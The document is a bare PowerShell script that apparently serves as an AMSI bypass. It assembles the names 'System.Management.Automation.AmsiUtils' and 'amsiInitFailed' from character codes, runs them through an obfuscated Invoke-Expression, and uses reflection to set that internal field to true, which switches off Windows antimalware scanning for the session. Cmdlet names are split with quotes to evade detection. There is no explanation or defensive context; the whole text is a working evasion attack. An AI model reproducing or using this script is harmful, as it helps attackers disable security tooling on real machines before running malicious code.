$b = "[char]83 + [char]121 + [char]115 + [char]116 + [char]101 + [char]109 + [char]46 +[char]77 + [char]97"
$b2 = "[char]110 + [char]97 + [char]103 + [char]101 + [char]109"
$b21 = "[char]101 + [char]110 + [char]116 + [char]46 + [char]65 + [char]117 + [char]116 +[char]111 + [char]109 + [char]97"
$b3 = "[char]116 + [char]105 + [char]111 + [char]110 +[char]46 + [char]65 + [char]109 + [char]115 + [char]105 + [char]85 + [char]116 +[char]105 + [char]108 + [char]115"
$c = "[char]97 + [char]109 + [char]115 + [char]105 + [char]73 +[char]110 + [char]105 + [char]116 + [char]70 + [char]97 +[char]105 + [char]108 + [char]101 + [char]100"
$ama=@("i"+[char]101+"X")
$d="[char]78 + [char]111 + [char]110 + [char]80 + [char]117 + [char]98 + [char]108 + [char]105 + [char]99"
$f="[char]83 + [char]116 + [char]97 + [char]116 + [char]105 + [char]99"
$b_exp = .($ama -join"")($b)
$b2_exp = .($ama -join"")($b2)
$b21_exp = .($ama -join"")($b21)
$b3_exp = .($ama -join"")($b3)
$c_exp = .($ama -join"")($c)
$a = [Ref].Assembly.GetType($b_exp+ $b2_exp + $b21_exp + $b3_exp).GetFields("NonPublic,Static") | Whe''re-Ob''Je''cT { $_.Name -like $c_exp }
$a.SetValue($null, $true)
